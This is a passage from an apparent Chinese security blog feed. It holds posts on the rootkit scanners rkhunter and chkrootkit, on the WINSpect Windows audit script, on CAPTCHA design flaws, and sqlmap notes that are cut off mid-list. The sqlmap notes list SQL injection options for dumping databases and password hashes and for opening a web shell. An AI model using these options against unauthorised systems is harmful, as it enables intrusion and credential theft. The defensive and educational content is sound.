作为cron任务定期运行</span><br><span class="line">sk, <span class="comment">--skip-keypress   自动完成所有检测，跳过键盘输入</span></span><br><span class="line">summary   显示检测结果的统计信息</span><br><span class="line"><span class="keyword">update</span>    检测更新内容</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用--skip-keypress参数跳过回车</span></span><br><span class="line">rkhunter -c <span class="comment">--skip-keypress</span></span><br></pre></td></tr></table></figure></p><p>检查主要分成6个部分</p><ol><li>进行系统命令的检查，主要是检测系统的二进制文件，因为这些文件最容易被rootkit。显示OK字样表示正常，显示Warning表示有异常，需要引起注意，而显示“Not found”字样，一般无需理会。</li><li>主要检测常见的rootkit程序，显示绿色的“Not found”表示系统未感染此rootkit。</li><li>主要是一些特殊或附加的检测，例如对rootkit文件或目录检测、对恶意软件检测以及对指定的内核模块检测。</li><li>主要对网络、系统端口、系统启动文件、系统用户和组配置、SSH配置、文件系统等进行检测。</li><li>主要是对应用程序版本进行检测。</li><li>其实是上面输出的一个总结，通过这个总结，可以大概了解服务器目录的安全状态。</li></ol><p>设置定时任务</p><p><code>0 3 * * * /usr/sbin/rkhunter -c --skip-keypress 2&gt;&amp;1 | mail -s &quot;rkhunter Reports of My Server&quot; you@yourdomain.com</code></p><h4 id="2-2-2-chkrootkit"><a href="#2-2-2-chkrootkit" class="headerlink" title="2.2.2 chkrootkit"></a>2.2.2 chkrootkit</h4><p>Chkrootkit是一个在本地系统检查rootkit痕迹的工具，它是检查系统二进制文件是否被rootkit病毒修改的一个shell脚本。</p><h5 id="安装说明"><a href="#安装说明" class="headerlink" title="安装说明"></a>安装说明</h5><p><a href="http://www.chkrootkit.org/" target="_blank" rel="noopener">官方地址</a><br><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 安装编译工具包</span></span><br><span class="line">yum install gcc gcc-c++ make</span><br><span class="line">yum install glibc-<span class="keyword">static</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># 安装chkrootkit </span></span><br><span class="line">wget ftp:<span class="comment">//ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz</span></span><br><span class="line">tar zxvf chkrootkit.tar.gz</span><br><span class="line">cd chkrootkit</span><br><span class="line">make sense</span><br><span class="line"><span class="meta"># 常用参数</span></span><br><span class="line">-h 显示帮助信息</span><br><span class="line">-V 显示版本信息</span><br><span class="line">-l 显示测试内容</span><br><span class="line">-d debug模式，显示检测过程的相关指令程序</span><br><span class="line">-q 安静模式，只显示有问题部分，</span><br><span class="line">-x 高级模式，显示所有检测结果</span><br><span class="line">-r dir 设定指定的目录为根目录</span><br><span class="line">-p dir1:dir2:dirN 检测指定目录</span><br><span class="line">-n 跳过NFS连接的目录</span><br><span class="line"></span><br><span class="line"><span class="meta"># 使用，出现INFECTED就说明系统可能有问题了</span></span><br><span class="line">./chkrootkit | grep INFECTED</span><br></pre></td></tr></table></figure></p><p>设置定时任务</p><p><code>0 3 * * * /usr/sbin/chkrootkit 2&gt;&amp;1 | mail -s &quot;chkrootkit Reports of My Server&quot; you@yourdomain.com</code></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-描述&quot;&gt;&lt;a href=&quot;#0x00-描述&quot; class=&quot;headerlink&quot; title=&quot;0x00 描述&quot;&gt;&lt;/a&gt;0x00 描述&lt;/h2&gt;&lt;p&gt;当我们的应用系统被入侵后，系统是否已被黑客上传webshell甚至植入木马后门程序。如果依靠人工排查，一是工作量大，二是需要一定程度的技术知识和业务知识才能判断什么是正常什么是异常。工作量大决定排查工作不可能由个别具有技术知识和业务知识的人来完成工作而需要其他人员参与，而如果这些没有“一定程度的技术知识和业务知识”的人员参与基本必然后导致大量的误报和漏报（主要是漏报）。总而言之，在大量设备场景中人工排查后门是很难切实有效推行的排查手段。&lt;/p&gt;
&lt;h2 id=&quot;0x01-Webshell查杀&quot;&gt;&lt;a href=&quot;#0x01-Webshell查杀&quot; class=&quot;headerlink&quot; title=&quot;0x01 Webshell查杀&quot;&gt;&lt;/a&gt;0x01 Webshell查杀&lt;/h2&gt;&lt;h3 id=&quot;1-1-D盾-Web查杀&quot;&gt;&lt;a href=&quot;#1-1-D盾-Web查杀&quot; class=&quot;headerlink&quot; title=&quot;1.1 D盾_Web查杀&quot;&gt;&lt;/a&gt;1.1 D盾_Web查杀&lt;/h3&gt;&lt;p&gt;D盾Web查杀是一个永久免费的网站D盾Web查杀，软件使用自行研发不分扩展名的代码分析引擎，能分析更为隐藏的WebShell后门行为&lt;/p&gt;
&lt;p&gt;引擎特别针对：一句话后门、变量函数后门、${}执行、`执行、preg_replace执行、call_user_func、file_put_contents、fputs 等特殊函数的参数进行针对性的识别，能查杀更为隐藏的后门，并把可疑的参数信息展现在你面前，让你能更快速的了解后门的情况&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;PS: 不再更新D盾_web查杀的查杀引擎,只更新查杀库到2019.1.1，之后将不再更新查杀库&lt;br&gt;
    
    </summary>
    
      <category term="应急响应" scheme="http://www.pa55w0rd.club/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    
      <category term="工具使用" scheme="http://www.pa55w0rd.club/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
      <category term="应急响应" scheme="http://www.pa55w0rd.club/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>WINSpect-基于Powershell的Windows安全审计工具</title>
    <link href="http://www.pa55w0rd.club/winspect/"/>
    <id>http://www.pa55w0rd.club/winspect/</id>
    <published>2018-12-03T03:59:36.000Z</published>
    <updated>2018-12-03T06:11:40.596Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><a href="https://github.com/A-mIn3/WINspect" target="_blank" rel="noopener">项目地址</a></p></blockquote><h2 id="0x00-描述"><a href="#0x00-描述" class="headerlink" title="0x00 描述"></a>0x00 描述</h2><p>WINSpect是一款基于Powershell的Windows安全审计工具，可用于枚举和识别Windows平台的安全漏洞，以进一步的优化和加固平台的安全防护策略。</p><h2 id="0x01-功能"><a href="#0x01-功能" class="headerlink" title="0x01 功能"></a>0x01 功能</h2><p>WINSpect将为我们提供审计检查和枚举：</p><ul><li>检查已安装的安全产品</li><li>检查DLL劫持</li><li>检查用户账户控制设置<a id="more"></a></li><li>本地文件系统共享</li><li>具有本地组成员身份的域用户和组</li><li>注册表autoruns</li><li>可由Authenticated Users组成员配置的本地服务</li><li>Authenticated Users组成员可以写入相应二进制文件的本地服务</li><li>非system32 Windows托管服务及其相关的DLL</li><li>非引用服务路径漏洞</li><li>非系统计划任务DLL劫持</li><li>自动安装</li></ul><h2 id="0x02-使用"><a href="#0x02-使用" class="headerlink" title="0x02 使用"></a>0x02 使用</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone git@github.com:A-mIn3/WINspect.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用管理员权限打开powershell，并运行WINSpect脚本</span></span><br><span class="line">.\WINspect.ps1</span><br></pre></td></tr></table></figure><h2 id="0x03-排错"><a href="#0x03-排错" class="headerlink" title="0x03 排错"></a>0x03 排错</h2><p>Win10系统使用过程中报错<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.\WINspect.ps1 : 无法加载文件 E:\WINspect\WINspect.ps1，因为在此系统上禁止运行脚本。有关详细信息，请参阅 http</span><br><span class="line">s:/go.microsoft.com/fwlink/?LinkID=<span class="number">135170</span> 中的 about_Execution_Policies。</span><br><span class="line">所在位置 行:<span class="number">1</span> 字符: <span class="number">1</span></span><br><span class="line">+ .\WINspect.ps1</span><br><span class="line">+ ~~~~~~~~~~~~~~</span><br><span class="line">    + CategoryInfo          : SecurityError: (:) []，PSSecurityException</span><br><span class="line">    + FullyQualifiedErrorId : UnauthorizedAccess</span><br></pre></td></tr></table></figure></p><p>是因为Windows PowerShell 执行策略限制你确定 Windows PowerShell 加载配置文件并运行脚本的条件。</p><p>通过<code>Get-ExecutionPolicy</code>命令获取挡前执行策略，默认执行策略为<code>Restricted</code></p><ul><li>允许单独的命令，但不会运行脚本。</li><li>阻止所有脚本文件的运行，包括格式设置文件和配置文件 (.ps1xml)、模块脚本文件 (.psm1) 和 Windows PowerShell 配置文件 (.ps1)。</li></ul><p>更改执行策略<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ExecutionPolicy</span> -ExecutionPolicy RemoteSigned</span><br><span class="line"></span><br><span class="line">执行策略更改</span><br><span class="line">执行策略可帮助你防止执行不信任的脚本。更改执行策略可能会产生安全风险，如 https:/go.microsoft.com/fwlink/?LinkID=<span class="number">135170</span></span><br><span class="line">中的 about_Execution_Policies 帮助主题所述。是否要更改执行策略?</span><br><span class="line">[Y] 是(Y)  [A] 全是(A)  [N] 否(N)  [L] 全否(L)  [S] 暂停(S)  [?] 帮助 (默认值为“N”): y</span><br></pre></td></tr></table></figure></p><p>详细内容参考<a href="https://docs.microsoft.com/zh-cn/previous-versions/windows/powershell-scripting/hh847748(v=wps.640" target="_blank" rel="noopener">about_Execution_Policies</a>)</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/A-mIn3/WINspect&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;项目地址&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00-描述&quot;&gt;&lt;a href=&quot;#0x00-描述&quot; class=&quot;headerlink&quot; title=&quot;0x00 描述&quot;&gt;&lt;/a&gt;0x00 描述&lt;/h2&gt;&lt;p&gt;WINSpect是一款基于Powershell的Windows安全审计工具，可用于枚举和识别Windows平台的安全漏洞，以进一步的优化和加固平台的安全防护策略。&lt;/p&gt;
&lt;h2 id=&quot;0x01-功能&quot;&gt;&lt;a href=&quot;#0x01-功能&quot; class=&quot;headerlink&quot; title=&quot;0x01 功能&quot;&gt;&lt;/a&gt;0x01 功能&lt;/h2&gt;&lt;p&gt;WINSpect将为我们提供审计检查和枚举：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;检查已安装的安全产品&lt;/li&gt;
&lt;li&gt;检查DLL劫持&lt;/li&gt;
&lt;li&gt;检查用户账户控制设置
    
    </summary>
    
      <category term="note" scheme="http://www.pa55w0rd.club/categories/note/"/>
    
    
      <category term="windows 审计工具" scheme="http://www.pa55w0rd.club/tags/windows-%E5%AE%A1%E8%AE%A1%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>如何设计相对安全的图形验证码？ （转发）</title>
    <link href="http://www.pa55w0rd.club/captcha/"/>
    <id>http://www.pa55w0rd.club/captcha/</id>
    <published>2018-11-27T10:02:10.000Z</published>
    <updated>2018-11-27T10:46:09.333Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>转自 <a href="https://mp.weixin.qq.com/s/5hUS9Mbc1NHi5MEZpGcGEA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/5hUS9Mbc1NHi5MEZpGcGEA</a></p></blockquote><h2 id="0x00-验证码是什么"><a href="#0x00-验证码是什么" class="headerlink" title="0x00 验证码是什么"></a>0x00 验证码是什么</h2><p>验证码（CAPTCHA）即“Completely Automated Public Turing test to tell Computers and Humans Apart”（全自动区分计算机和人类的图灵测试）的缩写，是一种区分用户是计算机还是人的公共全自动程序。</p><h2 id="0x01-有什么作用"><a href="#0x01-有什么作用" class="headerlink" title="0x01 有什么作用"></a>0x01 有什么作用</h2><p>简单概括如下：</p><p>验证码在网络投票、交友论坛、网上商城等业务中，经常用来防止恶意用户侵入、恶意灌水、刷票，爆破、撞库、接口滥用等问题，为防止客户端用程序进行自动识别，因此图片中通常要加上一些干扰象素，由用户肉眼识别其中的验证码信息。客户输入表单提交时，验证码也提交给网站服务器，只有验证成功，才能执行相应的操作，其在Web安全中有着重要的应用。 　　<br><a id="more"></a><br>好了，废话不多说，为了回答我们最初的问题，我们必须要知道图形验证码在设计和使用中有哪些坑，哪些地方容易出问题。</p><h2 id="0x02-设计或使用方法不当"><a href="#0x02-设计或使用方法不当" class="headerlink" title="0x02 设计或使用方法不当"></a>0x02 设计或使用方法不当</h2><ol><li>图形验证码数值在返回包中返回前端(可通过自动化程序输入验证码，导致验证码无效，导致防护失效)</li><li>图形验证码的值由前端生成，发送到后端形成图片</li><li>图形验证码验证后不失效（成功或失败都应该失效）,可以无限复用</li><li>单独验证图形验证码，正确返回1，错误返回0，而认证请求却不包含图形验证码（可以绕过前端验证）</li><li>万能图形验证码（测试环境为方便设置的万能验证码，上线后未关闭）</li><li>验证码参数值为空时不检测图形验证码</li><li>无验证码参数时(参数名和参数值都不存在)不检测图形验证码(一般是之前设计的时候没加图形验证码，后期添加图形验证码时保留了老接口)</li><li>验证码大小值由前端控制,后端无大小检测(生成超大图形验证码，造成内存耗尽，拒绝服务)</li><li>图形验证码过于简单(无扭曲，无干扰线导致，可自动化图像识别)</li><li>认证过程中，先验证账号密码，后验证图形验证码(逻辑顺序有误，验证码起不到防护作用)</li><li>验证码图片中数值不够随机，可预测导致可以猜解。</li></ol><h2 id="0x03-如何设计出一个相对安全的图形验证码"><a href="#0x03-如何设计出一个相对安全的图形验证码" class="headerlink" title="0x03 如何设计出一个相对安全的图形验证码"></a>0x03 如何设计出一个相对安全的图形验证码</h2><p><strong>设计上：</strong></p><ol><li>验证码字符集合和长度应可配置，至少四位，不允许单独使用英文字符或数字。</li><li>验证码要能够置设置背景色、字符颜色、字符旋转、扭曲、字符粘连等，要添加干扰线，干扰线的颜色、尺寸和数量要可通过配置进行设定。</li><li>验证码生成过程中不仅要使用安全随机函数还要确保种子绝对随机的，保证每次生成验证码的唯一性和不可预测性，防止重放攻击。</li><li>针对一次请求生成的验证码只能用一次，用完立即过期。每次生成的验证码不允许跨会话和请求使用。</li><li>验证码内容不允许以任何形式输出到客户端包括验证码的MD5值、 Base64转码值等。</li></ol><p><strong>另外图形验证码使用上应注意：</strong></p><ol><li>验证码参数和认证参数需要一起提交，到后端验证时要先验证验证码，正确后再进行后续认证。</li><li>后台系统中验证码的验证逻辑要先于口令的验证，只有通过验证码的验证后才能进行用户名、口令等其他身份信息的验证过程。</li><li>线上系统不应存在万能验证码，或不验证验证码内容的情况</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;转自 &lt;a href=&quot;https://mp.weixin.qq.com/s/5hUS9Mbc1NHi5MEZpGcGEA&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://mp.weixin.qq.com/s/5hUS9Mbc1NHi5MEZpGcGEA&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00-验证码是什么&quot;&gt;&lt;a href=&quot;#0x00-验证码是什么&quot; class=&quot;headerlink&quot; title=&quot;0x00 验证码是什么&quot;&gt;&lt;/a&gt;0x00 验证码是什么&lt;/h2&gt;&lt;p&gt;验证码（CAPTCHA）即“Completely Automated Public Turing test to tell Computers and Humans Apart”（全自动区分计算机和人类的图灵测试）的缩写，是一种区分用户是计算机还是人的公共全自动程序。&lt;/p&gt;
&lt;h2 id=&quot;0x01-有什么作用&quot;&gt;&lt;a href=&quot;#0x01-有什么作用&quot; class=&quot;headerlink&quot; title=&quot;0x01 有什么作用&quot;&gt;&lt;/a&gt;0x01 有什么作用&lt;/h2&gt;&lt;p&gt;简单概括如下：&lt;/p&gt;
&lt;p&gt;验证码在网络投票、交友论坛、网上商城等业务中，经常用来防止恶意用户侵入、恶意灌水、刷票，爆破、撞库、接口滥用等问题，为防止客户端用程序进行自动识别，因此图片中通常要加上一些干扰象素，由用户肉眼识别其中的验证码信息。客户输入表单提交时，验证码也提交给网站服务器，只有验证成功，才能执行相应的操作，其在Web安全中有着重要的应用。 　　&lt;br&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://www.pa55w0rd.club/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="验证码安全" scheme="http://www.pa55w0rd.club/tags/%E9%AA%8C%E8%AF%81%E7%A0%81%E5%AE%89%E5%85%A8/"/>
    
      <category term="安全设计" scheme="http://www.pa55w0rd.club/tags/%E5%AE%89%E5%85%A8%E8%AE%BE%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>sqlmap笔记</title>
    <link href="http://www.pa55w0rd.club/sqlmap/"/>
    <id>http://www.pa55w0rd.club/sqlmap/</id>
    <published>2018-11-27T09:04:23.000Z</published>
    <updated>2019-01-14T07:42:31.340Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-安装"><a href="#0x00-安装" class="headerlink" title="0x00 安装"></a>0x00 安装</h2><p>git clone <a href="https://github.com/sqlmapproject/sqlmap.git" target="_blank" rel="noopener">https://github.com/sqlmapproject/sqlmap.git</a></p><h2 id="0x01-基本用法"><a href="#0x01-基本用法" class="headerlink" title="0x01 基本用法"></a>0x01 基本用法</h2><h3 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-dbs       <span class="string">//</span>列举数据库</span><br><span class="line"><span class="params">--count</span> -D “数据库”   <span class="string">//</span>获取表中数据个数</span><br><span class="line"><span class="params">--current-db</span>           <span class="string">//</span>列举当前数据库</span><br><span class="line"><span class="params">--users</span> <span class="params">--passwords</span>              <span class="string">//</span>列举数据库用户名</span><br><span class="line"><span class="params">--current-user</span>               <span class="string">//</span>列举当前用户</span><br><span class="line"><span class="params">--privileges</span>               <span class="string">//</span>查看权限</span><br><span class="line"><span class="params">--os-shell</span>                    <span class="string">//</span>写web shell</span><br><span class="line"><span class="params">--is-dba</span>                    <span class="string">//</span>判断当前用户是不是dba</span><br><span class="line"><span class="params">--tables</span> -D <span class="string">"数据库"</span>          <span class="string">//</span>列举数据库的表名</span><br><span class="line"><span class="params">--columns</span> -T <span class="string">"表名"</span> -D <span class="string">"数据库"</span>       <span class="string">//</span> 列举列名</span><br><span class="line"><span class="params">--dump</span> -C <span class="string">"列名"</span> -T <span class="string">"表名"</span> -D <span class="string">"数据库"</span>           <span class="string">//</span>列举数据</span><br><span class="line"><span class="params">--start=</span>：指定开始的行</span><br><span class="line"><span class="params">--stop=</span>：指定结束的行</span><br><span class="line"><span class="params">--threads=</span>:线程数</span><br><span class="line"></span><br><span class="line">存储数据在 <span class="string">./sqlmap/output/.......</span></span><br><span class="line">-f <span class="params">--banner</span> <span class="params">--dbs</span> <span class="params">--users</span> <span class="params">--batch</span> <span class="params">--crawl=3</span></span><br><span class="line">当<span class="params">--level</span>为2以上，会尝试注入cookie</span><br><span class="line">当<span class="params">--level</span>为3以上，会尝试注入user-agent、referer</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h3><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line">获取目标方式</span><br><span class="line">     -<span class="ruby">u          /<span class="regexp">/指定目标</span></span></span><br><span class="line"><span class="ruby">     -l        /<span class="regexp">/从burp或webscarab代理中获取日志</span></span></span><br><span class="line"><span class="ruby">     -m     /<span class="regexp">/ 从文本中获取多个目标扫描</span></span></span><br><span class="line"><span class="ruby">     -r      /<span class="regexp">/从文件中加载http请求</span></span></span><br><span class="line"><span class="ruby">     -g      /<span class="regexp">/处理google的搜索结果 inurl:\".php?id=1\"       --smart</span></span></span><br><span class="line"><span class="ruby">请求</span></span><br><span class="line"><span class="ruby">     --data     /<span class="regexp">/把数据以post方式提交</span></span></span><br><span class="line"><span class="ruby">     --param-del     /<span class="regexp">/当get或post的数据需要用其他字符分割时    --data="id=1;id=2" --param-del=";"</span></span></span><br><span class="line"><span class="ruby">     --cookie     /<span class="regexp">/http cookie头</span></span></span><br><span class="line"><span class="ruby">     --drop-set-cookie     /<span class="regexp">/拒绝cookie</span></span></span><br><span class="line"><span class="ruby">     --user-agent</span></span><br><span class="line"><span class="ruby">     --random-agent     /<span class="regexp">/修改user-agent参数</span></span></span><br><span class="line"><span class="ruby">     --referer      /<span class="regexp">/伪造referer</span></span></span><br><span class="line"><span class="ruby">     --headers      /<span class="regexp">/增加额外的http头</span></span></span><br><span class="line"><span class="ruby">     --auth-type,--auth-cred      /<span class="regexp">/http认证保护 --auth-type Basic(Basic、Digest、NTLM) --auth-cred "testuser:testpass"</span></span></span><br><span class="line"><span class="ruby">     --auth-cert     /<span class="regexp">/http协议的证书认证</span></span></span><br><span class="line"><span class="ruby">     --proxy     /<span class="regexp">/http代理</span></span></span><br><span class="line"><span class="ruby">     --proxy-cred</span></span><br><span class="line"><span class="ruby">     --ignore-proxy      /<span class="regexp">/拒绝使用本地局域网代理</span></span></span><br><span class="line"><span class="ruby">     --delay      /<span class="regexp">/设定两个请求件的延迟，默认0s</span></span></span><br><span class="line"><span class="ruby">     --timeout     /<span class="regexp">/请求超时判断，默认30s</span></span></span><br><span class="line"><span class="ruby">     --retries     /<span class="regexp">/当超时是，重试次数，默认3次</span></span></span><br><span class="line"><span class="ruby">     --randomize     /<span class="regexp">/使参数值随机改变，长度类型不变</span></span></span><br><span class="line"><span class="ruby">     --scope     /<span class="regexp">/使用正则过滤目标网址，例如：python sqlmap.py -l burp.log --scope="(www)?\.target\.(com|net|org)"</span></span></span><br><span class="line"><span class="ruby">     --safe-url,--safe-freq     /<span class="regexp">/避免过多错误请求被屏蔽</span></span></span><br><span class="line"><span class="ruby">     --skip-urlencode     /<span class="regexp">/关闭URL参数值编码</span></span></span><br><span class="line"><span class="ruby">     --eval     /<span class="regexp">/执行自定义的python代码</span></span></span><br><span class="line"><span class="ruby">注入</span></span><br><span class="line"><span class="ruby">     -p     /<span class="regexp">/设定想要测试的参数</span></span></span><br><span class="line"><span class="ruby">     --skip     /<span class="regexp">/设定不要测试的参数</span></span></span><br><span class="line"><span class="ruby">     --dbms      /<span class="regexp">/指定数据库</span></span></span><br><span class="line"><span class="ruby">     --os      /<span class="regexp">/指定数据库服务器的系统     </span></span></span><br><span class="line"><span class="ruby">     --invalid-bignum     /<span class="regexp">/指定无效的大数字， 默认情况下id=13，sqlmap会变成id=-13来报错，你可以指定比如id=9999999来报错。</span></span></span><br><span class="line"><span class="ruby">     --invalid-logical     /<span class="regexp">/指定无效的逻辑， 可以指定id=13把原来的id=-13的报错改成id=13 AND 18=19</span></span></span><br><span class="line"><span class="ruby">     --tamper     /<span class="regexp">/修改注入的数据，查看 ./tamper</span><span class="regexp">/ 可用脚本</span></span></span><br><span class="line"><span class="ruby">探测</span></span><br><span class="line"><span class="ruby">     --level     /<span class="regexp">/探测等级</span></span></span><br><span class="line"><span class="ruby">     --risk      /<span class="regexp">/风险等级 ，在./xml</span><span class="regexp">/payloads.xml/</span>中</span></span><br><span class="line"><span class="ruby">     --string     /<span class="regexp">/页面比较， 用户可以提供一个字符串或者一段正则匹配，在原始页面与真条件下的页面都存在的字符串，而错误页面中不存在，添加字符串     </span></span></span><br><span class="line"><span class="ruby">     --regexp     /<span class="regexp">/页面比较，添加正则</span></span></span><br><span class="line"><span class="ruby">     --<span class="keyword">not</span>-string     /<span class="regexp">/页面比较， 用户可以提供一段字符串在原始页面与真条件下的页面都不存在的字符串，而错误页面中存在的字符串</span></span></span><br><span class="line"><span class="ruby">     --code     /<span class="regexp">/页面比较， 用户也可以提供真与假条件返回的HTTP状态码不一样来注入</span></span></span><br><span class="line"><span class="ruby">     --text-only     /<span class="regexp">/页面比较， 用户知道真条件下的返回页面与假条件下返回页面是不同位置在哪里可以使用，http响应体不同</span></span></span><br><span class="line"><span class="ruby">     --titles     /<span class="regexp">/页面比较，html的title标签中不同</span></span></span><br><span class="line"><span class="ruby">注入技术     </span></span><br><span class="line"><span class="ruby">     --technique     /<span class="regexp">/测试是否是注入，指定使用的探测技术，默认会测试所有的方式（B/</span>E/U/S/T）</span></span><br><span class="line"><span class="ruby">     --time-sec     /<span class="regexp">/设定延迟注入的时间，默认5s</span></span></span><br><span class="line"><span class="ruby">     --union-cols     /<span class="regexp">/设定union查询的字段数，默认1-10个字段数</span></span></span><br><span class="line"><span class="ruby">     --union-char     /<span class="regexp">/设定union查询使用的字符</span></span></span><br><span class="line"><span class="ruby">     --second-order     /<span class="regexp">/二阶sql注入， 有些时候注入点输入的数据看返回结果的时候并不是当前的页面，而是另外的一个页面，这时候就需要你指定到哪个页面获取响应判断真假。 --second-order后面跟一个判断页面的URL地址。</span></span></span><br><span class="line"><span class="ruby">列数据</span></span><br><span class="line"><span class="ruby">     -b,--banner     /<span class="regexp">/标志，返回数据库的版本号</span></span></span><br><span class="line"><span class="ruby">     --current-db     /<span class="regexp">/返回当前链接的数据库</span></span></span><br><span class="line"><span class="ruby">     --is-dba     /<span class="regexp">/判断当前用户是否为管理</span></span></span><br><span class="line"><span class="ruby">     --users     /<span class="regexp">/列数据库管理用户</span></span></span><br><span class="line"><span class="ruby">     --passwords     /<span class="regexp">/列出用户和用户的hash，并尝试破解</span></span></span><br><span class="line"><span class="ruby">     --privileges     /<span class="regexp">/列出数据库管理员权限</span></span></span><br><span class="line"><span class="ruby">     --roles     /<span class="regexp">/勒出数据库管理员角色，仅适用于Oracle</span></span></span><br><span class="line"><span class="ruby">     --dbs     /<span class="regexp">/列出数据库系统的数据库</span></span></span><br><span class="line"><span class="ruby">     --tables     /<span class="regexp">/列举数据库表，--exclude-sysdbs指不包含了所有的系统数据库，-D指定数据库</span></span></span><br><span class="line"><span class="ruby">     --columns     /<span class="regexp">/列出指定数据库表中的字段和数据类型，-D 指定数据库，-T 指定表</span></span></span><br><span class="line"><span class="ruby">     --schema     /<span class="regexp">/列举数据库系统的架构， 